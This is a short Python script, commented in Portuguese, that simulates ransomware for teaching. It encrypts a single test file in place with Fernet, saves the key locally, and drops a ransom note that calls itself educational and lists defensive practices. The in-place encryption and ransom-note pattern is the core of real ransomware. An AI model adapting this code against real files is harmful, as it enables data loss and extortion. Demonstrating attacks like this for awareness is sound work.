from cryptography.fernet import Fernet
import os

# Caminho do arquivo de teste
file_path = "test_files/exemplo.txt"

# Gerar chave de criptografia
key = Fernet.generate_key()

# Salvar chave em arquivo
with open("thekey.key", "wb") as key_file:
    key_file.write(key)

# Inicializar Fernet
fernet = Fernet(key)

# Ler conteúdo original
with open(file_path, "rb") as file:
    original_data = file.read()

# Criptografar conteúdo
encrypted_data = fernet.encrypt(original_data)

# Sobrescrever arquivo com conteúdo criptografado
with open(file_path, "wb") as encrypted_file:
    encrypted_file.write(encrypted_data)

# Criar mensagem de resgate simulada
ransom_note = """
Seus arquivos foram criptografados.

Esta é apenas uma simulação educacional.

Boas práticas reais:
- mantenha backups atualizados
- utilize MFA
- aplique patches de segurança
- evite phishing
- utilize EDR/Antivírus
"""

with open("ransom_note.txt", "w", encoding="utf-8") as note:
    note.write(ransom_note)

print("Arquivo criptografado com sucesso.")
print("Mensagem de resgate criada.")